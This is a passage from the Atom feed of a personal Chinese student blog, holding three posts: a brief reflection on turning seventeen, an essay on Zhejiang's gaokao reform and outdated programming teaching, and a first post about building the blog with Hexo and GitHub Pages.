    <content type="html"><![CDATA[<h2 id="十七岁终于向我走来"><a class="markdownIt-Anchor" href="#十七岁终于向我走来"></a> 十七岁终于向我走来</h2><p>Rainbow总觉得十七是个挺神奇的数字。</p><h2 id="世界"><a class="markdownIt-Anchor" href="#世界"></a> 世界</h2><p>世界已经一点点在我们面前展开，充满活力与生气的时代已经到来。</p><p>无尽的知识和信息沿着互联网席卷着这个世界，未来有许多的可能展现在我们面前。</p><p>这个世界终将一次次地颠覆我们的认知，改变我们的思考。</p><p>这个有着无限可能的世界终将去往何处······</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;十七岁终于向我走来&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#十七岁终于向我走来&quot;&gt;&lt;/a&gt; 十七岁终于向我走来&lt;/h2&gt;
&lt;p&gt;Rainbow总觉得十七是个挺神奇的数字。&lt;/p&gt;
&lt;h2 id=&quot;世界&quot;&gt;&lt;a class=&quot;mar
      
    
    </summary>
    
    
      <category term="Daily" scheme="https://blog.rainbowyang.moe/categories/Daily/"/>
    
    
      <category term="日常" scheme="https://blog.rainbowyang.moe/tags/%E6%97%A5%E5%B8%B8/"/>
    
      <category term="思考" scheme="https://blog.rainbowyang.moe/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>高考改革漫想</title>
    <link href="https://blog.rainbowyang.moe/post/Daily/Thinking-of-Gaokao-Reforming.html"/>
    <id>https://blog.rainbowyang.moe/post/Daily/Thinking-of-Gaokao-Reforming.html</id>
    <published>2017-05-29T05:46:00.000Z</published>
    <updated>2020-07-16T03:19:21.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>这篇文章是Rainbow在学校让所有人都参加作文比赛的时候在学校一口气写出来的。<br />一不小心写完了作文纸全部的格子。</p><p>到现在也有一段时间了，但Rainbow决定不做大的更改(改一些语文方面的小问题)，直接打出来。</p><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><p>关于浙江的高考改革，在我身边和网上也有着无数人在议论纷纷。我身边的老师似乎大多都是消极和反对的态度，吐槽这不好，吐槽那不好，觉得这有很多的投机取巧，田忌赛马的成分；当然也有少部分老师对新高考改革表示赞同，觉得改革也需要有时间去修改其中不好的地方。</p><p>但其实那所在乎的唯一目标就是考上更好的大学罢了。似乎那三年紧紧地围绕着的只是上大学，不是别的。曾有老师说过，只要你苦了这三年，熬了下来，上了一个好的大学，就辛福了，轻松了。</p><p>假如一个人辛苦地读了三年高中，掌握了丰富的各种各样的“知识”——解题技巧，那应该是能考一个较好的大学了。然后呢？就不辛苦了？上大学不应该只是为了那一张毕业证书，而是为了更多的知识，这种日子又谈何轻松。</p><p>有高中老师曾抱怨初中只教中考要考的，却不花时间去教虽然不考但是真正也有用的知识。但现在不也还是有很多老师喜欢严格看着考纲，不考的牢记于心，并和同学们说这高考不要求，便匆匆略过，犹如蜻蜓点水，也或毫不提及，只因高考不考或是多年没考而积累出来的所谓经验。</p><p>这次高考改革，浙江首创将技术纳入选考范围，实行“七选三”，但这项原来在“考大学”中学里不被重视的技术被纳入高考，起初也是让我激动一下，但随即我也觉得也仍有不少问题。</p><p>众所周知，技术分为通用技术和信息技术，但其实这两门课关系并不很大，之所以将其合起来，我想大概是这两门课在众人心目中，分量还是不够重吧！通用技术主要涉及动手和设计方面，而信息技术，便是与当今的互联网是息息相关的，而其中涉及到了计算机编程，这便是让我激动的原因。</p><p>在我初中的时候，我便遇见了我的第一门编程语言——Java。我当时便被其吸引了，而开始了在网上的自学。虽然说学习的时候，前后断断续续，但是我一直都没有放弃，一直到现在。而它也花了我许许多多的时间，但我也从来没有为此而感到后悔过，因为我觉得我的时间花的是有意义的，有价值的，尽管我也并不觉得我已是小有所成，或许也只是刚刚入门，但毕竟路还长着。</p><p>信息技术这门课里的编程语言用的是VisualBASIC，但让我感到惊讶地是他的版本竟然是1998年的。在如今这个入火箭班起飞的互联网时代，让我们学的居然是上个世纪版本的编程语言，其教材和语言的落后程度可想而知。IDE和报错机制的难用让我无语。</p><p>有一次，老师竟然翻出十几年前的资料，还开心地认为没有过时，可以继续用，而这一切之间的相对而言更是让我无语。与教材比，没有“过时”……</p><p>听闻，信息教材将会更新一次，同时也会抛弃98年的VB，而是使用Python。还有会带来许多跟接近“现代”的知识，虽说这一切已与我无关，但我却更在乎于对于使用新教材之后，那些老师的态度。似乎反而带着抱怨和无奈，只是因为他们要重新学习，重新编出教学资源。也有人侥幸我们似乎逃过了这场大更新，但是这真的有意义吗？而这有让我迷惑于新旧教材交替之际，高二高三使用不一样的教材，而出现类似于2015年10月的那场前无高三，只有高二的大好投机机会，那到底要如何解决。</p><p>授人以鱼不如授人以渔。接下来是一个信息爆炸的时代，每个人都应该有自己获取知识的欲望与能力，而不是牢记那所谓解题技巧。唯一的技巧便是能够不断学习的能力，这才是教育应该做到的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;这篇文章是Rainbow在学校让所有人都参加作文比赛的时候在学校一口气写出来的。&lt;br /&gt;
一不小心写完了作文纸全部的格子。&lt;/p&gt;
&lt;p&gt;到
      
    
    </summary>
    
    
      <category term="Daily" scheme="https://blog.rainbowyang.moe/categories/Daily/"/>
    
    
      <category term="日常" scheme="https://blog.rainbowyang.moe/tags/%E6%97%A5%E5%B8%B8/"/>
    
      <category term="思考" scheme="https://blog.rainbowyang.moe/tags/%E6%80%9D%E8%80%83/"/>
    
      <category term="教育" scheme="https://blog.rainbowyang.moe/tags/%E6%95%99%E8%82%B2/"/>
    
  </entry>
  
  <entry>
    <title>开博客的想法</title>
    <link href="https://blog.rainbowyang.moe/post/Blog/Open-Blog.html"/>
    <id>https://blog.rainbowyang.moe/post/Blog/Open-Blog.html</id>
    <published>2017-03-12T04:38:00.000Z</published>
    <updated>2020-07-16T03:18:25.980Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>其实很早之前便想开一个自己的博客。</p><p>在去年的暑假，我就迫不及待的买下了这个域名<a href="https://RainbowYang.moe/" target="_blank" rel="noopener" title="现在换成RainbowYang.moe了">（Rainbow-Yang.moe）</a>，但是并没有买个vps(然后这个域名就一直放在那里了)，直到最近才把这个建博客的事给完成了。</p><p>这个博客用的是<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a>，不得不说这个玩意还是比较方便的。几个简单的指令就能完成许多的事情(渲染，部署，还有在本地建一个服务器)。</p><p>但是还是没有服务器，那这个又有什么用?那么这货就来了，有了<a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>我们可以直接在本地用Hexo生成文件，然后部署到github上。</p><p>开博客的事一拖再拖，到现在总算是完成了。但这其实更是一个开始，一个全新的开始。</p><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><p>那么开这个博客的想法到底是什么呢？</p><p>我自己觉得是有这么几个目的：</p><h3 id="1克服对于写作的一些消极心理"><a class="markdownIt-Anchor" href="#1克服对于写作的一些消极心理"></a> 1.克服对于写作的一些消极心理</h3><p>其实我一直以来都不太乐于写作，甚至还有些害怕，最讨厌的是莫过于写那些被固定了的作文，感觉没有什么好写。所以久而久之对于写作也便产生了一种不好的感觉。</p><p>而开起这个博客，能让我写一些我想写的东西，这或许会让我逐渐地摆脱这种心理(希望能这样，鬼知道我以后会写多久)。</p><h3 id="2作为对于我学习编程的记录"><a class="markdownIt-Anchor" href="#2作为对于我学习编程的记录"></a> 2.作为对于我学习(编程)的记录</h3><p>从初中开始接触了Java，然后和身边的一些人一起开始自学。一直到现在的高中，虽说断断续续，我可以说还是一直坚持了下来，但是也有一些人弃坑而去了(本来就没几个人)。</p><p>现在还在一起学的(其实这也谈不上一起学，主要都是自己在网上学，平时交流还比较多的)的似乎也就只剩这货——<a href="https://gogo.moe/" target="_blank" rel="noopener" title="这是博客">Gogo</a>了.</p><p>我平时在网上看到一些东西想要记录下来，但却又总是无动于衷，那么在这里我可能放一些学习的记录吧。主要可能会是编程之类的，但也有可能是其他的。</p><h3 id="3对我自己学习的一种激励"><a class="markdownIt-Anchor" href="#3对我自己学习的一种激励"></a> 3.对我自己学习的一种激励</h3><p>我现在主要在用的主要还是Java，在下一个貌似就是JavaScript了。</p><p>对Java而言，我还在写一个软件——<a href="https://github.com/RainbowYang/FunctionPainter" target="_blank" rel="noopener" title="给个GitHub的链接">FunctionPainter</a>，已传到GitHub。这个东西的主要功能顾名思义也就是一个可以生成函数图像的画板，之后会专门写一个博文来记录<del>吧<del> 。</del></del></p><p>而JavaScript，我却暂时找不到什么东西可做，所以也想通过博客来加大对于这方面的接触，来让自己进一步的去学习这方面，也是作为一种动力。</p><h2 id="尾"><a class="markdownIt-Anchor" href="#尾"></a> 尾</h2><p>总算写完了我的第一篇博文，也不知会有谁会来到这个不知名的地方，看到这里。而我又会收获到什么。</p><p>但这都不重要，一切从这开始。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#前言&quot;&gt;&lt;/a&gt; 前言&lt;/h2&gt;
&lt;p&gt;其实很早之前便想开一个自己的博客。&lt;/p&gt;
&lt;p&gt;在去年的暑假，我就迫不及待的买下了这个域名&lt;a href=&quot;https://RainbowYa
      
    
    </summary>
    
    
      <category term="Blog" scheme="https://blog.rainbowyang.moe/categories/Blog/"/>
    
    
      <category term="博客" scheme="https://blog.rainbowyang.moe/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
</feed>
